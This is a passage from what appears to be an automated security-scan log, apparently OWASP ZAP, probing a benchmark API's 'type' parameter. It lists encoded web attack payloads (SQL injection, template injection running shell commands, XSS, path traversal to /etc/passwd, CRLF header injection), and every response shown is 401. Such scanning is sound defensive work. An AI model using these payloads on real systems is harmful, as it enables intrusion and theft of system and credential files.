  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2522%252F%253E%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2522&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2522java.lang.Thread.sleep%2522%252815000%2529&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2523%257B%2525x%2528sleep+15%2529%257D&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2527%2528&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%252F%252F1498374535918995670.owasp.org&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%252F&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%252Fetc%252Fpasswd&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%252Fuser-data&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%252FWEB-INF%252Fweb.xml&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%253B&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%253C%2521--&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%253C&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%255Cuser-data&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%255CWEB-INF%255Cweb.xml&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%255D%255D%253E&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=%257Bsystem%2528%2522sleep+15%2522%2529%257D&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=07fguhh2ugwp6oo7uw72w1ixx249vl1n1o53lteoiw8eiroueqhn8hbb0zo0&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=0W45pz4p&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=1498374535918995670.owasp.org&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=5%253BURL%253D%2527https%253A%252F%252F1498374535918995670.owasp.org%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=any%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=any%253F%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=BGCIktuTgAuncvMrpCmrlZsJmfcJpUQZQkupWuhQfEoHmoSCwTwLZghaSvtHJgoOeEeTXVayBtnHqQjpHGgxRGPbrEhTKVTYLGOvagHMYajaYqxnmZIhQNUTgTUAyIbsjcJimjHTnShKnWcBDDJBNTIEAwoTDDhoHpWMnvwFuxEVypvPZqKFiNoOopYyNGDyVmoNPiqstnINMOWwbfrQMMVVAwrxaYYadBofgahBZAKdgiVUSsjDoGsembgfLXSOpIIUlHRELAgFmpcaPxsKsWMlnWCJPLXTJbKepeehsIdqeNBXyggymVRsCyYBFCbOMZoIObBwIXaBCUyMRHgyKoDIidceeraoIAaFDCacGKENdTRxsoTsievEcRAnfUhBLtHnpRuXlBeiplROoHuXCkPYpcgoBQSOeLLMVthquKnGSRqmwOYmFXlffntGIqGyJYLhgkfwgPIEfrjDshCpSiVXoXjvioIuybkMrCsuaIVNbCHPSuXalpUyJuMKmoMjRXAUXstVLPAcDBhtVuoMuWQmSXlGMXdJInulLjNNlEVWYvGsCbwWFDBniSEewLZNYqwWVlZPCJurPdGQAGwVRwRCOSVZatyBjbavWZRbQDPfxtcSxYoBdDkEGSfhkGNnIrbZVSojuoWKMLBHgTaSHyokYVKclDSXJyBCGTqRdrXXjxVLpdWwhlCvPnqEMrBJPUWignkGoobAXZvJnZkYeIMdoaudJQkZycijgqwmURMifBfokvGMSmFjVpFJTwOgyEBqOiXxtIJsYXjfuRfZBcLlPNKyMpjuSMATeVTvATUglUwfnOcObQcXswFRskmmVPdGvMbWXbuKjmtSItiQNQVxmfQRhRTWNOIKIXyPYwFDmDaxHTklOPeIRadJjcqSTbcwRFJRHtXyEctfHSQowAqLqwxFEnYsHslMGpvqoTAqkFPBUniImeAkrSPoyNKtguaQLpZuiIBCYDmFepmYyRkFYOqgHbJWtBNcfbPsAOhOPHtkIUImRMsBNEedfPJtqoWkRuRMCxCNFddgVeSANsbtghBnRNwdDUqkBYuJwENhaovtTZoWWWLhJJvhqbToMpnjhJLixZwqTSnKTxNupHZOFreNcMimKHJvKocWdCgWOtLVQUeJlvkxaZCiiLYlUYCBlvKXOajTmqxVwTMhUeHVorVEFkjDlhevQrrKbqJIFpRCmTSNBwtxupPLasxZOUkYjmxLOjTOTYAnJVhRPyFvqIlmdqnLZpgBVPvyiMkJwbTvGBGApllHUuOppVdTuBHDiPOboioYsPQEwKiUZxSTZFRNOUDiYJWGyFnBYqgRqxhZWZBXBsFTRDlsmVDphuNyJuidyZrBrKdFgETKMrTBWQSFIsjPpqyuinhMrEJyuePduwWNXWFnmRLVFefRUJqEAPVYXaDRCNBbCOqJsdrRCNNTaDZKZgPRAXGJNHuhtdSSroNouAmUpBNmgYyYhSwGrJSBecJSGtIxqGyImAYlGJLhQnxBQggOjaIMfiIdeDFTkTrAPwBmGMXfpeywyeHECuiqiQGecByfwvWmJQRZjlHEgTbrAPnseeNkosnITXKgHxubiuMvSxdUbdTceFxfNZFeWLdchXplKgZscqsNCdfvlIKMfOkqeiAqEpjVpmQiYxnpdQOILIBZyoRRhWHCmnEDjCCIljuvXDupmMNCAGbKRvCYXEfUnQJygyWsdyyOkwnIixbHuhBNoahxrILwVcUtVMDttJVWOcDphNwcRFGDIEpdkQswQdUkUCEtNPmsniTjifdXIfrcsBuXuMhqmgKadeAyjbXkkgDIwYirtLOqbYoLYBCbmhEAFLXgKXubfaBEOaLMBqaeOsTAdtLymhlduocWBNbKooVNeAWeNjgdLCTLmaqrRiCtWaQTQsuZAYjIEXDQGSUditJLYBIVPvnbaDIWBygCUZSKRkpcHdtbkEFCXGNYxTwKtkEfOojqKFgHBiBFbslJhQoDUbZjIWaoDfYYgFimTWJoEGdpHBNccqYdHkUWetBGfwCTXjBPlxvqwBXmETeTFchmDKXtdgmlpKyxlxpWIBjxjqnYXQAqcAlKXiYcVKjGqwSpvfvWdMvW&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=c%253A%252F&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=c%253A%252FWindows%252Fsystem.ini&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=c%253A%255C&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=c%253A%255CWindows%255Csystem.ini&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
